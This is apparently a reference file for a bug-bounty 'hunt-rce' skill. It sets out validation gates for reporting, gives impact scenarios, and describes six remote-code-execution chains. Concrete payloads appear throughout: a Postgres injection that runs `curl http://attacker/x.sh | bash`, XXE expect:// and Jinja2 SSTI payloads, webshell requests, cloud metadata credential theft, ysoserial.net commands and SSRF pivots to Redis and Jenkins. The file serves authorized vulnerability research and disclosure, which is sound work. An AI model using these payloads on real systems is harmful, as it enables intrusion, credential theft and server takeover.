# Details (moved from SKILL.md)

> Extended reference content for `hunt-rce`, kept under `references/` so the entrypoint stays within the audit budget.

## Gate 0 Validation

Before writing the report, confirm all three:

**1. What can the attacker DO right now?**
You must be able to demonstrate one of: execute `id`/`whoami` and capture the output, make a DNS/HTTP callback from the target server to your controlled host, write a file to the filesystem, or read `/etc/passwd`. "Might be able to" fails this gate.

**2. What does the victim LOSE?**
Articulate the concrete impact: source code exfiltration, credential theft (database, API keys, cloud IAM), lateral movement to internal network, supply chain compromise of downstream users, data destruction. Generic "attacker gains RCE" fails — name the crown jewels at risk.

**3. Can it be reproduced in 10 minutes from scratch?**
Write the reproduction steps before submitting. If you need more than: (a) a Burp request, (b) a payload file, and (c) a listener — simplify it. If reproduction requires a specific race condition, timing, or ephemeral state, document the exact conditions. Triagers who can't reproduce in one attempt will downgrade or close the report.

---


## Real Impact Examples

**Scenario A: Management Console Role → Root Shell (Enterprise Server)**
An attacker with a low-privileged "Management Console Editor" account on a GitHub Enterprise Server instance identified that the syslog-ng configuration UI accepted a free-form "destination" field. By injecting a `program()` destination containing a reverse shell command, the attacker caused the syslog-ng daemon (running as root) to execute arbitrary OS commands upon log receipt. The same attack surface was independently found in collectd's exec plugin configuration and nomad's job template rendering — all reachable from the same editor role. Impact: full root compromise of the enterprise git server hosting all organization source code, secrets, and CI/CD pipelines.

**Scenario B: Dependency Confusion → RCE on Build Infrastructure**
A researcher enumerated internal npm package names by reviewing JavaScript bundles served from target CDN endpoints and public GitHub repositories belonging to a major payments platform. Several `@internal/*` scoped packages were referenced but not registered on the public npm registry. The researcher published higher-versioned packages with identical names containing a postinstall script that executed a canary callback. Within hours, the callback fired from multiple IP addresses belonging to the target's CI/CD build farm — confirming that every npm install on their build infrastructure executed attacker-controlled code. The same technique worked against a ride-sharing platform's internal tooling. Impact: arbitrary code execution on build servers with access to production deployment credentials and signing keys.

**Scenario C: Exposed Kubernetes API → Cluster Takeover**
During reconnaissance on a target's cloud infrastructure, a researcher discovered a publicly accessible Kubernetes API server (port 6443) with overly permissive RBAC. Using default service account tokens and unauthenticated API calls, the researcher enumerated running pods, retrieved secrets from the default namespace (including database credentials and third-party API keys), and demonstrated the ability to spawn privileged pods with `hostPID: true` — enabling full node compromise. The Kubernetes cluster managed the target's core production services. Impact: access to all stored secrets, ability to deploy malicious workloads, and pivot to every service in the cluster.

---


## Chains & Compositions (Senior Hunting)

RCE in 2020-2026 rarely arrives at a single sink. Every modern RCE is composed of (1) a primitive that puts attacker bytes onto the host or into a deserialization pipeline, plus (2) an exec gadget that interprets them. The chains below decompose six high-paying RCE shapes into their primitive components — each step is testable in isolation, the chain is what pays.

### Chain 1 — SSRF + IMDSv1 + Leaked IAM Role → Lambda Invoke → Backend RCE (Capital One pattern)

- **A.** SSRF on a server-side fetcher (link-preview, image proxy, webhook URL, PDF generator). Confirmed via Burp Collaborator OOB callback.
- **B.** Point SSRF at AWS IMDSv1 metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → returns temporary STS credentials.
- **C.** Use the credentials with `aws lambda invoke --function-name <internal-function>` — Lambda runs server-side code that the attacker can influence via the function's input parameter.
- **Impact:** Full backend RCE in the Lambda context, plus pivot path to whatever else the role grants (S3 / DynamoDB / RDS).
- **Real shape:** Capital One 2019 — $80M civil penalty, attacker conviction. SSRF in a WAF on EC2 → IMDSv1 → IAM role → 106M-record breach via S3 sync. Cross-refs `hunt-ssrf` Disclosed Report Citation #6.

### Chain 2 — SQLi + `COPY FROM PROGRAM` → Direct OS-level RCE on Postgres Host

- **A.** SQLi confirmed on a Postgres backend (boolean/time-based works; UNION not needed).
- **B.** The DB user has either `pg_read_server_files` or `COPY` privileges (default for many AWS RDS / Google Cloud SQL roles when "admin" databases exist).
- **C.** Stack a query: `'; COPY users FROM PROGRAM 'curl http://attacker/x.sh | bash'; --` → Postgres shells out to `/bin/sh -c <attacker command>` → RCE as `postgres` user. <!-- security-allowlist: curl-pipe-bash -->
- **Impact:** RCE as the database user, which on managed Postgres frequently has IAM credentials and direct access to other AWS resources.
- **Real shape:** Multiple H1 disclosures 2020-2024 across SaaS apps backed by Postgres. Cross-refs `hunt-sqli` Disclosed Report Citation #12 and root cause discussion of `FILE`/`xp_cmdshell` privileges.

### Chain 3 — Image Upload + Path Traversal in Filename + Misconfigured MIME Serving → Webshell

- **A.** File upload accepts images (`image/png`, `image/jpeg`). The server saves with the user-supplied filename or only validates Content-Type, not actual content.
- **B.** Upload a `.aspx`/`.jsp`/`.php` file with the correct image magic-bytes (`GIF89a` + PHP after) and a filename containing `../` to write outside the upload directory into the web-root (`../../../public/webshell.php`).
- **C.** Request `https://target/webshell.php?cmd=id` — server's PHP/ASP.NET handler runs the script regardless of extension policy because the path doesn't pass through the upload-dir filter.
- **Impact:** Unauthenticated or low-priv attacker gets webshell on the application server with the web-server's process privileges.
- **Real shape:** Multiple disclosed H1 cases on legacy upload handlers; canonical pre-2020 RCE class. Pairs with `hunt-file-upload` (upload bypass table) and `hunt-misc` path-traversal patterns.

### Chain 4 — Prototype Pollution + Lodash/Mongoose Gadget Chain → `child_process.spawn` → Node RCE

- **A.** Identify prototype pollution sink — JSON merge / Object.assign / lodash `_.merge` / Node `Object.create` chain receiving attacker JSON.
- **B.** Pollute `Object.prototype.shell` to `true` OR `Object.prototype.env.NODE_OPTIONS` to `--require ./malicious.js`. The polluted prototype reaches a downstream `child_process.spawn` or `vm.runInThisContext`.
- **C.** Sink executes with attacker-controlled shell/env → attacker code runs in Node.js process context with full access to environment variables, AWS metadata, internal services.
- **Impact:** Server-side JS execution from a JSON POST. Common in Express apps using `body-parser` + `lodash.merge` for config-merging.
- **Real shape:** `lodash.merge` CVE-2018-16487, CVE-2019-10744, CVE-2020-8203; `mongoose` CVE-2024-53900 (cross-refs `hunt-sqli` Disclosed Report Citation #10 — same gadget family reaches Mongo `$where` instead of process).

### Chain 5 — Unencrypted ViewState + Recovered MachineKey → ASP.NET Deserialization → RCE (ToolShell class)

- **A.** Identify an ASP.NET endpoint where `__VIEWSTATEENCRYPTED=""` (ViewState is signed but not encrypted). Confirm via Burp / curl on form-bearing pages.
- **B.** Recover the `<machineKey>` validationKey — via config leak (`/web.config` accessible), via subdomain takeover of a sibling app sharing the key, or via the CVE-2025-53771 ToolShell exploit chain that exfils the key on Subscription Edition.
- **C.** Forge a ViewState using `ysoserial.net --plugin=ViewState --validationkey=<key>` with a `TypeConfuseDelegate` / `WindowsIdentity` payload. Submit to the endpoint. ASP.NET deserialises into a method-call gadget chain ending in `Process.Start` → RCE as the worker-process identity.
- **Impact:** Full RCE on the IIS web front-end with whatever the AppPool identity grants — often `NETWORK SERVICE` (with SharePoint farm-account access) or higher.
- **Real shape:** CVE-2025-53770 / 53771 ToolShell (July 2025 emergency advisory); SP2013 unpatched-by-EoL exposure. Cross-refs `hunt-sharepoint` ToolShell precondition chain and `hunt-aspnet` ViewState dual-parser anti-pattern.

### Chain 6 — XXE + PHP `expect://` Stream Wrapper → Direct RCE on Legacy PHP

- **A.** XXE confirmed via OOB DTD callback (`<!ENTITY % x SYSTEM "http://attacker/dtd">`).
- **B.** Target runs PHP with the `expect` extension enabled (rare in 2026, but still present on legacy hosts and some shared-hosting providers).
- **C.** Send `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>` — PHP's stream wrapper executes `id` through expect → output returned in entity expansion or via OOB.
- **Impact:** RCE as the PHP/web-server user without needing a separate upload or SQLi primitive.
- **Real shape:** Rockstar Games emblem editor XXE H1 #347139 (2018, $1,500); Adobe Commerce CosmicSting CVE-2024-34102 (XXE → RCE via crypt-key exfil). Cross-refs `hunt-xxe` Disclosed Report Citation #7 and #10.

### Operator-level pattern

Every modern RCE chain has two halves: **the bytes get there** (SSRF, SQLi, upload, prototype-pollution, ViewState, XXE) and **the bytes get interpreted** (lambda invoke, COPY PROGRAM, webshell handler, child_process.spawn, deserializer gadget, expect://). Hunt for the first half; the second is usually one of the six above. If your first-half primitive doesn't compose with any of these — pause before submitting. "Could lead to RCE" is Low/Medium; "RCE demonstrated end-to-end" is Critical.

Cross-references:
- `hunt-ssrf` — Chain 1
- `hunt-sqli` — Chain 2
- `hunt-file-upload` — Chain 3
- `hunt-api-misconfig` (proto-pollution) — Chain 4
- `hunt-sharepoint` + `hunt-aspnet` — Chain 5
- `hunt-xxe` — Chain 6

---


## Related Skills & Chains

- **`hunt-ssti`** — Template engines that hit `eval()`/`exec()`/`os.system()` are RCE hiding behind a render call. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` reflected in email-template preview → unauthenticated RCE as the worker process. <!-- security-allowlist: documented payload technique reference, do not execute outside authorized scope -->
- **`hunt-file-upload`** — File-write primitives become RCE when the upload directory is web-served, processed by a deserializer, or loaded by a `.htaccess`/`web.config`. Chain primitive: SVG/PHP polyglot bypasses MIME check → direct `GET /uploads/shell.php?cmd=id` → RCE; or DOCX with `phar://` stream wrapper → PHP object deserialization → RCE.
- **`hunt-ssrf`** — When the RCE primitive lives on an internal-only endpoint (admin console, internal Redis, Jenkins script-console), gate it through an SSRF. Chain primitive: external SSRF → `http://127.0.0.1:8080/manage/scriptText` (Jenkins/Tomcat) → Groovy `Runtime.exec` → RCE; or SSRF → `gopher://redis:6379` write to crontab → RCE.
- **`hunt-aspnet`** — ASP.NET ViewState deserialization is a giant RCE class behind a known `__VIEWSTATE` parameter. Chain primitive: machineKey recovery (or leaked `<machineKey>` from `web.config` disclosure) → `ysoserial.net -p ViewState -g TypeConfuseDelegate` → RCE as `IIS APPPOOL\<name>`.
- **`security-arsenal`** — Reach for the deserialization payload tree (ysoserial Java gadget chains, ysoserial.net for .NET ViewState/BinaryFormatter, Python pickle `__reduce__`, Ruby Marshal, PHP `phar://` metadata, Node `node-serialize` IIFE) the moment you have a sink that accepts serialized bytes.
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical. A "blind RCE" that turns out to be file-write-only with no execution path is not RCE; a sandboxed eval that can't reach `os` is at best Medium SSTI. Prove `whoami`/OOB DNS callback with a unique marker before writing the report.

